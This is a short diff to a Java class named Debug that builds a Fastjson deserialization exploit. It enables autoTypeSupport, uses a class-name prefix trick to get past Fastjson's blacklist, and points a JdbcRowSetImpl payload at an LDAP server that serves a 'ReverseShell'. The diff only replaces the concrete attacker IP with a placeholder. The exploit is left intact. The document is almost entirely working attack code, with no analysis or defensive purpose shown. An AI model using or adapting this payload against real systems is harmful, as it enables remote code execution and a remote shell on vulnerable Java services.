@@ -12,7 +12,7 @@ public class Debug {
         //开启autotypesupport
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         //黑名单绕过
-        String expstr = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://103.133.176.97:1389/ReverseShell\", \"autoCommit\":true}";
+        String expstr = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://x.x.x.x:xxxx/ReverseShell\", \"autoCommit\":true}";
         JSON.parseObject(expstr);
     }
 }
